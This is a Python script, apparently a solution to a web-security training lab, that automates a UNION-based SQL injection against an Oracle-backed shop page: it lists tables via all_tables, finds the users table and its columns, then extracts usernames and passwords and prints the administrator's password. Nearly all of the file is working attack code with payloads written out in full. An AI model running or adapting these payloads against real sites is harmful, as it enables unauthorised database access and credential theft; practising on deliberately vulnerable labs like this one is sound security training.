#SQL injection attack, listing the database contents on Oracle
import requests
import os
import re

def index(filetxt,keywords,n,cn):
 file=open(filetxt,"r+",encoding="utf8")
 file_line=[line for line in file]
 c=0
 if cn == 0:
    cn=2
 for line in file_line :
     c += 1
     
     if line.find(keywords) >=0  :
      
      if cn == 1 :
        
         line = c + n
        
         file = open(filetxt)
         lines_to_print = [line]

         for index, line in enumerate(file):
           if ( index in lines_to_print):
             word=line.strip().replace("<th>","").replace("</th>","").replace("~"," : ")
             return(word)
      else:
          cn = 1
 file.close()
 

#os.remove(filetxt)

url="https://ac1e1fa71fa2cfaf8027066a00c40034.web-security-academy.net/"
path="filter?category=Corporate+gifts"
payload="'+UNION+SELECT+table_name,NULL+FROM+all_tables--"

r=requests.get(url+path+payload).text

file = open("filetxt","w+",encoding="utf8")
file.write(r)
file.close()


users = index("filetxt","USERS_",-1,0)

payload2="'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='"+users+"'--"

r2=requests.get(url+path+payload2).text

file = open("filetxt2","w+",encoding="utf8")
file.write(r2)
file.close()

password = index("filetxt2","PASSWORD_",-1,1)
username = index("filetxt2","USERNAME_",-1,1)

payload3="'+UNION+SELECT+"+username+",+"+password+"+FROM+"+users+"--"

r3=requests.get(url+path+payload3).text

file = open("filetxt3","w+",encoding="utf8")
file.write(r3)
file.close()

admin_pass=index("filetxt3","administrator",0,1).replace("<td>","").replace("</td>","")
             
print(admin_pass)


